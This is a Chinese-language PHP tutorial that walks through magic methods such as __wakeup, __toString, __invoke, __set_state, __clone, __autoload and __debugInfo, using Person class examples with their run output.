<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    public $sex;</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line"></span><br><span class="line">    public function __construct($name=&quot;&quot;,  $age=25, $sex=&#x27;Male&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age  = $age;</span><br><span class="line">        $this-&gt;sex  = $sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup() &#123;</span><br><span class="line">        echo &quot;但使用 unserialize() 方法反序列化一个对象后会自动调用该魔术方法\n&quot;;</span><br><span class="line">        $this-&gt;age = 520;</span><br><span class="line">        $this-&gt;school = &#x27;HuaQiao&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = new Person(&#x27;Yufei&#x27;,30,&#x27;Male&#x27;);</span><br><span class="line"></span><br><span class="line">$s = serialize( $person );</span><br><span class="line">echo $s,&quot;\n&quot;;</span><br><span class="line">$person2 = unserialize( $s );</span><br><span class="line">echo $person2-&gt;name,&quot;\n&quot;;</span><br><span class="line">echo $person2-&gt;age,&quot;\n&quot;;</span><br><span class="line">echo $person2-&gt;schoo,&quot;\n&quot;;</span><br></pre></td></tr></table></figure>
<p>运行结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[yufei@localhost php]$ php demo.php </span><br><span class="line">O:6:&quot;Person&quot;:3:&#123;s:3:&quot;sex&quot;;s:4:&quot;Male&quot;;s:4:&quot;name&quot;;s:5:&quot;Yufei&quot;;s:3:&quot;age&quot;;i:30;&#125;</span><br><span class="line">但使用 unserialize() 方法反序列化一个对象后会自动调用该魔术方法</span><br><span class="line">Yufei</span><br><span class="line">520</span><br></pre></td></tr></table></figure>
<h1>__toString()</h1>
<p>不知道大家在日常 PHP 编程中有没有发现，是不能直接用 <code>echo</code> 语句直接输出一个对象的，也不能用字符串连接符 ( <code>.</code> ) 拼接一个对象的，不信的话，请看下面的代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    public $sex;</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line"></span><br><span class="line">    public function __construct($name=&quot;&quot;,  $age=25, $sex=&#x27;Male&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age  = $age;</span><br><span class="line">        $this-&gt;sex  = $sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = new Person(&#x27;Yufei&#x27;,30,&#x27;Male&#x27;);</span><br><span class="line"></span><br><span class="line">echo $person;</span><br><span class="line"></span><br><span class="line">&#x27;The Person is:&#x27; . $person;</span><br></pre></td></tr></table></figure>
<p>会明显的报错</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[yufei@localhost php]$ php demo.php </span><br><span class="line"></span><br><span class="line">Recoverable fatal error: Object of class Person could not be converted to string in /Users/yufei/php/demo.php on line 18</span><br></pre></td></tr></table></figure>
<p>这是为什么呢 ？ 因为我们没有给它 ( 实例的类 ) 定义一个将对象转换为字符串的方法。</p>
<p>PHP 有规定，如果要将一个对象转换为字符串，必须定义 <code>__toString()</code> 魔术方法</p>
<p><strong>魔术方法 <code>__toString()</code></strong></p>
<p>当我们使用 <code>echo</code> 语句输出一个对象时，会自动检查一个对象有没有定义 <code>_toString()</code> 方法，如果定义了，就会输出 <code>__toString()</code> 方法的返回值，如果没有定义，那么会直接抛出一个异常，表明该对象不能直接转换为字符串</p>
<p>魔术方法 <code>__toString()</code> 的原型如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public string __toString()</span><br><span class="line">&#123;</span><br><span class="line">    // 将对象拼接成字符串的一些语句</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该方法没有任何参数，也不会传递任何参数，但该方法必须有一个返回值，该返回值必须是字符串，且只能是字符串</p>
<p><strong>范例</strong></p>
<p>下面的范例，我们友好的将 <code>Person</code> 对象输出为字符串形式，以人类易阅读的格式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    public $sex;</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line"></span><br><span class="line">    public function __construct($name=&quot;&quot;,  $age=25, $sex=&#x27;Male&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age  = $age;</span><br><span class="line">        $this-&gt;sex  = $sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        return sprintf(&#x27;Person(&quot;%s&quot;,%s,&quot;%s&quot;)&#x27;,$this-&gt;name,$this-&gt;age,$this-&gt;sex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = new Person(&#x27;Yufei&#x27;,30,&#x27;Male&#x27;);</span><br><span class="line"></span><br><span class="line">echo $person,&quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">echo &#x27;The Person is:&#x27; . $person, &quot;\n&quot;;</span><br></pre></td></tr></table></figure>
<p>运行结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[yufei@localhost php]$ php demo.php </span><br><span class="line">Person(&quot;Yufei&quot;,30,&quot;Male&quot;)</span><br><span class="line">The Person is:Person(&quot;Yufei&quot;,30,&quot;Male&quot;</span><br></pre></td></tr></table></figure>
<h1>__invoke()</h1>
<p>有时候，我们创建了一个实例后，是不是很想把这个实例当作一个方法来调用 ？默认情况下， 它会抛出一个异常的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    public $sex;</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line"></span><br><span class="line">    public function __construct($name=&quot;&quot;,  $age=25, $sex=&#x27;Male&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age  = $age;</span><br><span class="line">        $this-&gt;sex  = $sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = new Person(&#x27;Yufei&#x27;,30,&#x27;Male&#x27;);</span><br><span class="line"></span><br><span class="line">$person();</span><br></pre></td></tr></table></figure>
<p>错误如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[yufei@localhost php]$ php demo.php </span><br><span class="line"></span><br><span class="line">Fatal error: Uncaught Error: Function name must be a string in /Users/yufei/php/demo.php:18</span><br><span class="line">Stack trace:</span><br><span class="line">#0 &#123;main&#125;</span><br><span class="line">  thrown in /Users/yufei/php/demo.php on line 18</span><br></pre></td></tr></table></figure>
<p>错误提示表示，我们的 <code>$person</code> 并不是一个可用的函数名称。也的确是啊，它是一个对象的名称。</p>
<p>如果想要这么做而不报错，我们必须给类定义一个 <code>__invoke()</code> 魔术方法</p>
<p><strong>魔术方法 <code>__invoke()</code></strong></p>
<p>魔术方法 <code>__invoke()</code> 会在将一个对象当作一个方法来使用时会自动调用，该方法的原型如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public mixed __invoke() </span><br><span class="line">&#123;</span><br><span class="line">    // 其它功能</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该魔术方法可以有返回值，也可以没有，如果有返回值，也可以是任意类型，就上平常的方法或函数一样</p>
<p><strong>范例</strong></p>
<p>下面的代码，我们给 <code>Person</code> 类添加上 <code>__invoke()</code> 魔术方法，然后我们就可以将它的实例当作普通方法来调用了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    public $sex;</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line"></span><br><span class="line">    public function __construct($name=&quot;&quot;,  $age=25, $sex=&#x27;Male&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age  = $age;</span><br><span class="line">        $this-&gt;sex  = $sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        return &#x27;你好，我的名字是: &#x27;. $this-&gt;name . &#x27;，我 &#x27;. $this-&gt;age .&#x27; 岁了。&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = new Person(&#x27;Yufei&#x27;,30,&#x27;Male&#x27;);</span><br><span class="line"></span><br><span class="line">echo $person(), &quot;\n&quot;;</span><br></pre></td></tr></table></figure>
<p>运行结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[yufei@localhost php]$ php demo.php </span><br><span class="line">你好，我的名字是: Yufei，我 30 岁了</span><br></pre></td></tr></table></figure>
<h1>__set_state()</h1>
<p>如果我说一个方法，大家一定知道，那就是 <code>var_dump()</code>，因为它不仅会输出变量的值，还会输出变量的类型。如果我说另一个方法，可能就很少人知道了，那个方法是 <code>var_export()</code>，它的功能和 <code>var_dump()</code> 相同，不同的是，它仅会输出变量的值。</p>
<p>我们来看一段代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$person = array(&#x27;name&#x27;=&gt;&#x27;Yufei&#x27;,&#x27;age&#x27;=&gt;30,&#x27;sex&#x27;=&gt;&#x27;Male&#x27;);</span><br><span class="line">var_export($person);</span><br><span class="line">echo &quot;\n&quot;;</span><br></pre></td></tr></table></figure>
<p>运行结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[yufei@localhost php]$ php demo.php</span><br><span class="line">array (</span><br><span class="line">  &#x27;name&#x27; =&gt; &#x27;Yufei&#x27;,</span><br><span class="line">  &#x27;age&#x27; =&gt; 30,</span><br><span class="line">  &#x27;sex&#x27; =&gt; &#x27;Male&#x27;,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>知道这个方法的人，一般也就用它来输出 <a href="https://twle.cn/l/yufei/php/php-basic-arrays.html">数组 ( array ) </a>。很少人会用它来输出基础类型，因为那是 <code>echo</code> 的地盘，但如果用它来输出一个对象会怎么样呢 ？</p>
<p>我们接着看下面这段代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    public $sex;</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line"></span><br><span class="line">    public function __construct($name=&quot;&quot;,  $age=25, $sex=&#x27;Male&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age  = $age;</span><br><span class="line">        $this-&gt;sex  = $sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = new Person(&#x27;Yufei&#x27;,30,&#x27;Male&#x27;);</span><br><span class="line">var_export($person);</span><br><span class="line">echo &quot;\n&quot;;</span><br></pre></td></tr></table></figure>
<p>运行结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[yufei@localhost php]$ php demo.php</span><br><span class="line">Person::__set_state(array(</span><br><span class="line">   &#x27;sex&#x27; =&gt; &#x27;Male&#x27;,</span><br><span class="line">   &#x27;name&#x27; =&gt; &#x27;Yufei&#x27;,</span><br><span class="line">   &#x27;age&#x27; =&gt; 30,</span><br><span class="line">))</span><br></pre></td></tr></table></figure>
<p>不知道大家有没有注意到输出结果中的 <code>__set_state()</code> 。这是一个静态方法</p>
<p>如果我们想定制 <code>var_export()</code> 的结果要怎么做呢 ？</p>
<p><strong>静态魔术方法 <code>__set_state()</code></strong></p>
<p>在 PHP &lt; 5.1.0 的世界里，是没有办法的，但在 5.1.0 以上的版本中，PHP 提供了魔术方法 <code>__set_state()</code>，当把一个对象传递给 <code>var_export()</code> 的时候，会自动调用该静态魔术方法</p>
<p>该方法的原型如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static object __set_state ( array $properties )</span><br></pre></td></tr></table></figure>
<ul>
<li>首先，该方法是一个静态方法</li>
<li>其次，该方法有一个类型为数组的参数，包含按 <code>array('property' =&gt; value, ...)</code> 格式排列的类属性</li>
<li>再次，该方法必须有一个返回值，返回一个对象，一般情况下也是该类的一个实例</li>
</ul>
<p>不过这个方法的使用方式有点特别，你看了范例就懂了</p>
<p><strong>范例</strong></p>
<p>往常的，按照之前的魔术方法的使用方式，我们肯定会写出如下的代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    public $sex;</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line"></span><br><span class="line">    public function __construct($name=&quot;&quot;,  $age=25, $sex=&#x27;Male&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age  = $age;</span><br><span class="line">        $this-&gt;sex  = $sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static function __set_state( $an_array )</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;调用 __set_state() 方法\n&quot;;</span><br><span class="line">        $a = new Person();</span><br><span class="line">        $a-&gt;name = $an_array[&#x27;name&#x27;];</span><br><span class="line">        $a-&gt;school = &#x27;HuaQiao&#x27;;</span><br><span class="line">        return $a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = new Person(&#x27;Yufei&#x27;,30);</span><br><span class="line">$b = var_export($person, true);</span><br><span class="line">var_dump($b);</span><br></pre></td></tr></table></figure>
<p>但是，当你运行的时候，会大吃一惊，因为输出结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[yufei@localhost php]$ php demo.php</span><br><span class="line">string(87) &quot;Person::__set_state(array(</span><br><span class="line">   &#x27;sex&#x27; =&gt; &#x27;Male&#x27;,</span><br><span class="line">   &#x27;name&#x27; =&gt; &#x27;Yufei&#x27;,</span><br><span class="line">   &#x27;age&#x27; =&gt; 30,</span><br><span class="line">))&quot;</span><br></pre></td></tr></table></figure>
<p>难道是我们的函数写错了 ？ 难道是它不是一个静态方法 ？ 难道…为什么什么都没有</p>
<p>因为没有输出 <code>调用 __set_state() 方法</code> ，所以，该静态魔术方法根本就是没调用啊</p>
<p>然后，我就去翻了下手册，发现人家的使用方式是这样的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    public $sex;</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line"></span><br><span class="line">    public function __construct($name=&quot;&quot;,  $age=25, $sex=&#x27;Male&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age  = $age;</span><br><span class="line">        $this-&gt;sex  = $sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static function __set_state( $an_array )</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;调用 __set_state() 方法\n&quot;;</span><br><span class="line">        $a = new Person();</span><br><span class="line">        $a-&gt;name = $an_array[&#x27;name&#x27;];</span><br><span class="line">        $a-&gt;school = &#x27;HuaQiao&#x27;;</span><br><span class="line">        return $a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = new Person(&#x27;Yufei&#x27;,30);</span><br><span class="line">$b = var_export($person, true);</span><br><span class="line">var_dump($b);</span><br><span class="line">eval ( &#x27;$c = &#x27; . $b . &#x27;;&#x27; );</span><br><span class="line">var_dump($c);</span><br></pre></td></tr></table></figure>
<p>运行结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[yufei@localhost php]$ php demo.php</span><br><span class="line">string(87) &quot;Person::__set_state(array(</span><br><span class="line">   &#x27;sex&#x27; =&gt; &#x27;Male&#x27;,</span><br><span class="line">   &#x27;name&#x27; =&gt; &#x27;Yufei&#x27;,</span><br><span class="line">   &#x27;age&#x27; =&gt; 30,</span><br><span class="line">))&quot;</span><br><span class="line">调用 __set_state() 方法</span><br><span class="line">object(Person)#2 (4) &#123;</span><br><span class="line">  [&quot;sex&quot;]=&gt;</span><br><span class="line">  string(4) &quot;Male&quot;</span><br><span class="line">  [&quot;name&quot;]=&gt;</span><br><span class="line">  string(5) &quot;Yufei&quot;</span><br><span class="line">  [&quot;age&quot;]=&gt;</span><br><span class="line">  int(25)</span><br><span class="line">  [&quot;school&quot;]=&gt;</span><br><span class="line">  string(7) &quot;HuaQiao&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这又是什么操作 ？ 竟然又被调用了 ？</p>
<p>所以，从某些方面说，这个静态魔术方法的官方介绍，也是够坑的了 ？</p>
<p>这个魔术方法在什么时候调用呢 ？</p>
<p>在把 <code>var_export()</code> 方法生成的结果还原会对象的时候执行，可是，那为什么第一次输出的结果里没有 <code>school</code> 属性呢？ 令人费解</p>
<h1>__clone()</h1>
<p>大家在日常使用 PHP 时有需要用到复制一个对象的时候吗？就是使用 <code>clone</code> 关键子复制一个对象 ？那你知道 PHP 中的 <code>clone</code> 关键字是深拷贝还是浅拷贝 ( shallow copy ) 呢 ?</p>
<p>在笔者我自己的日常开发中，还真很少，或者几乎没有用到 <code>clone</code> 的机会，即使有，也不会往这边想 ！</p>
<p><strong>PHP 中的拷贝对象</strong></p>
<p>首先，需要声明的是，PHP 中的拷贝是 <strong>浅拷贝 ( shallow copy )</strong> ，也就是说，当我们使用 <code>clone</code> 拷贝一个对象后，新的对象的属性仍然会指向原来的旧对象的属性上</p>
<p>其次，PHP 对象的拷贝完成后，如果对象存在 <code>__clone()</code> 魔术方法，则还会自动调用该魔术方法，我们可以在该魔术方法里修改新对象的属性</p>
<p><strong>魔术方法 <code>__clone()</code></strong></p>
<p>当使用 <code>clone</code> 关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法 <code>__clone()</code> ，如果该魔术方法存在的话</p>
<p>该魔术方法的原型如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void __clone ( void )</span><br></pre></td></tr></table></figure>
<p><code>__clone()</code> 方法既没有返回值，也没有参数，因为它是在新对象上创建的。该魔术方法不能被外部主动调用，只能由 <code>clone</code> 关键字调用</p>
<p><strong>范例</strong></p>
<p>下面的方法，我们为 <code>Person</code> 类定义了魔术方法 <code>__clone()</code> ，并在该方法里面把 <code>计数 +1</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    public $sex;</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line">    public static $cnt = 1;</span><br><span class="line"></span><br><span class="line">    public function __construct($name=&quot;&quot;,  $age=25, $sex=&#x27;Male&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age  = $age;</span><br><span class="line">        $this-&gt;sex  = $sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __clone()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;自动调用魔术方法 __clone()\n&quot;;</span><br><span class="line">        self::$cnt++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = new Person(&#x27;Yufei&#x27;,30);</span><br><span class="line">var_dump(&#x27;person:&#x27;);</span><br><span class="line">var_dump($person);</span><br><span class="line">echo $person::$cnt,&quot;\n&quot;;</span><br><span class="line">$person2 = clone $person;</span><br><span class="line">var_dump(&#x27;person2:&#x27;);</span><br><span class="line">var_dump($person2);</span><br><span class="line">echo $person2::$cnt,&quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">$person3 = clone $person2;</span><br><span class="line">var_dump(&#x27;person3:&#x27;);</span><br><span class="line">var_dump($person3);</span><br><span class="line">echo $person3::$cnt,&quot;\n&quot;;</span><br></pre></td></tr></table></figure>
<p>运行结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[yufei@localhost php]$ php demo.php</span><br><span class="line">string(7) &quot;person:&quot;</span><br><span class="line">object(Person)#1 (3) &#123;</span><br><span class="line">  [&quot;sex&quot;]=&gt;</span><br><span class="line">  string(4) &quot;Male&quot;</span><br><span class="line">  [&quot;name&quot;]=&gt;</span><br><span class="line">  string(5) &quot;Yufei&quot;</span><br><span class="line">  [&quot;age&quot;]=&gt;</span><br><span class="line">  int(30)</span><br><span class="line">&#125;</span><br><span class="line">1</span><br><span class="line">自动调用魔术方法 __clone()</span><br><span class="line">string(8) &quot;person2:&quot;</span><br><span class="line">object(Person)#2 (3) &#123;</span><br><span class="line">  [&quot;sex&quot;]=&gt;</span><br><span class="line">  string(4) &quot;Male&quot;</span><br><span class="line">  [&quot;name&quot;]=&gt;</span><br><span class="line">  string(5) &quot;Yufei&quot;</span><br><span class="line">  [&quot;age&quot;]=&gt;</span><br><span class="line">  int(30)</span><br><span class="line">&#125;</span><br><span class="line">2</span><br><span class="line">自动调用魔术方法 __clone()</span><br><span class="line">string(8) &quot;person3:&quot;</span><br><span class="line">object(Person)#3 (3) &#123;</span><br><span class="line">  [&quot;sex&quot;]=&gt;</span><br><span class="line">  string(4) &quot;Male&quot;</span><br><span class="line">  [&quot;name&quot;]=&gt;</span><br><span class="line">  string(5) &quot;Yufei&quot;</span><br><span class="line">  [&quot;age&quot;]=&gt;</span><br><span class="line">  int(30)</span><br><span class="line">&#125;</span><br><span class="line">3</span><br></pre></td></tr></table></figure>
<h1>__autoload()</h1>
<p>如果上一章节中的 <code>clone</code> 关键字你不熟悉的话，想必 <code>__autoload()</code> 魔术函数你应该很熟悉了。</p>
<p><code>_autoload()</code> 魔术函数是 PHP 16 个魔术方法中仅有的定义在全局的魔术函数。</p>
<p>PHP 面试的时候经常爱问，你知道 PHP 中加载一个类有几种方式吗？</p>
<p>巴拉巴拉…，人家最重要的就是靠你 <code>spl_register_autoload()</code> 方法和 <code>__autoload()</code> 魔术方法</p>
<p><strong>魔术方法 <code>__autoload()</code></strong></p>
<p>很遗憾，随着 <code>spl_register_autoload()</code> 的完善，<code>__autoload()</code> 魔术方法在 <code>7.2.0</code> 版本中被标记为 「 已废弃 」 状态。在你的代码中，最好的就是使用 <code>spl_register_autoload()</code> 来取代它</p>
<p>不管 <code>_autoload()</code> 魔术方法的最终命运如何，我们不得不承认它开启了 PHP 自动加载类的新时代。</p>
<p>过去，有两种自动加载类的方式：</p>
<ol>
<li>把所有的类都定义在一个文件中，对，有可能，如果你看到那些古董代码，就会看到一个类文件中定义了不下 100 个类</li>
<li>使用 <code>Zend Framework</code> 提供的自动加载机制，也就是类名等于目录名</li>
</ol>
<p>但是，当 <code>__autoload()</code> 魔术方法出现后，情况立刻改变了</p>
<p>如果在你的应用程序里定义了魔术方法 <code>__autoload()</code> ，如果你使用了一个未定义的类。那么 PHP 就会自动调用该方法来加载那个类。这种机制下，我们可以一个类一个文件，如果配合命名空间，就可以抛弃 Zend Framework 那长长的类名，而且再也不用担心类名重复了。</p>
<p>该方法的原型如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void __autoload ( string $class )</span><br></pre></td></tr></table></figure>
<p>它没有任何返回值，而唯一的参数，就是需要加载的类名。</p>
<p><strong>范例</strong></p>
<p>假设我们的项目目录为 <code>/www/localhost/htdocs</code> ，在该目录下的 <code>classes</code> 子目录中存放了大量的类，比如</p>
<p>/www/localhost/htdocs/classes/Person1.class</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Person1</span><br><span class="line">&#123;</span><br><span class="line">    public $sex;</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line">    public static $cnt = 1;</span><br><span class="line"></span><br><span class="line">    public function __construct($name=&quot;&quot;,  $age=25, $sex=&#x27;Male&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age  = $age;</span><br><span class="line">        $this-&gt;sex  = $sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>/www/localhost/htdocs/classes/Person2.class</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Person2</span><br><span class="line">&#123;</span><br><span class="line">    public $sex;</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line">    public static $cnt = 1;</span><br><span class="line"></span><br><span class="line">    public function __construct($name=&quot;&quot;,  $age=25, $sex=&#x27;Male&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age  = $age;</span><br><span class="line">        $this-&gt;sex  = $sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>/www/localhost/htdocs/classes/Person3.class</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Person3</span><br><span class="line">&#123;</span><br><span class="line">    public $sex;</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line">    public static $cnt = 1;</span><br><span class="line"></span><br><span class="line">    public function __construct($name=&quot;&quot;,  $age=25, $sex=&#x27;Male&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age  = $age;</span><br><span class="line">        $this-&gt;sex  = $sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们就可以定一个 <code>__autoload()</code> 魔术函数来自动加载我们的 <code>Person1</code> 、<code>Person2</code> 和 <code>Person3</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function  __autoload($className) &#123;</span><br><span class="line">    $filePath = “/www/localhost/htdocs/classes/&#123;$className&#125;.php”;</span><br><span class="line">    if (is_readable($filePath)) &#123;</span><br><span class="line">        require($filePath);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = new Person1(&#x27;Yufei&#x27;);</span><br><span class="line">$person2 = new Person2(&#x27;Hero&#x27;);</span><br><span class="line">$person3 = new Person3(&#x27;Aini&#x27;);</span><br></pre></td></tr></table></figure>
<h1>__debugInfo()</h1>
<p>首先需要给大家道歉，说真的，我介绍这些魔术方法的时候并没有认真的先去看每一个魔术方法对应的是什么函数，只有要写那个魔术方法的时候才会认真去看。</p>
<p>导致了什么问题 ？</p>
<p>我以为 <code>var_dump()</code> 是没有对应的魔术方法的，可谁知，最后介绍的一个魔术方法 <code>__debugInfo()</code>，就对应着 <code>var_dump()</code></p>
<p>如果你认真看下来，我想，<code>__debugInfo()</code> 魔术方法应该不是什么难题了。</p>
<p><strong>魔术方法 <code>__debugInfo()</code></strong></p>
<p>从 PHP 5.6.0 开始，PHP 提供了 <code>__debugInfo()</code> 用于定制对象的 <code>var_dump()</code> 输出结果</p>
<p>{: .info }</p>
<p>当调用 <code>var_dump()</code> 输出一个对象时，如果该对象定义了 <code>__debugInfo()</code> 魔术方法，那么就会自动先调用该魔术方法返回的结果，然后再输出，否则默认会输出对象的所有可见属性</p>
<p>该魔术方法的原型如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array __debugInfo ( void )</span><br></pre></td></tr></table></figure>
<p>它没有任何参数，但返回值是数组类型。</p>
<p><strong>范例</strong></p>
<p>下面的范例，我们为 <code>Person</code> 类定义一个 <code>__debugInfo()</code> 用来定制 <code>var_dump()</code> 的输出结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Person &#123;</span><br><span class="line"></span><br><span class="line">    private $name;</span><br><span class="line"></span><br><span class="line">    public function __construct($name) &#123;</span><br><span class="line"></span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @return array</span><br><span class="line">     */</span><br><span class="line">    public function __debugInfo() &#123;</span><br><span class="line">        return [</span><br><span class="line">            &#x27;name_is&#x27; =&gt; $this-&gt;name . &#x27; www.twle.cn&#x27;</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var_dump(new Person(&#x27;Yufei&#x27;));</span><br></pre></td></tr></table></figure>
<p>输出结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">object(Person)#1 (1) &#123;</span><br><span class="line">  [&quot;name_is&quot;]=&gt;</span><br><span class="line">  string(17) &quot;Yufei www.twle.cn&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>PHP魔术方法</tag>
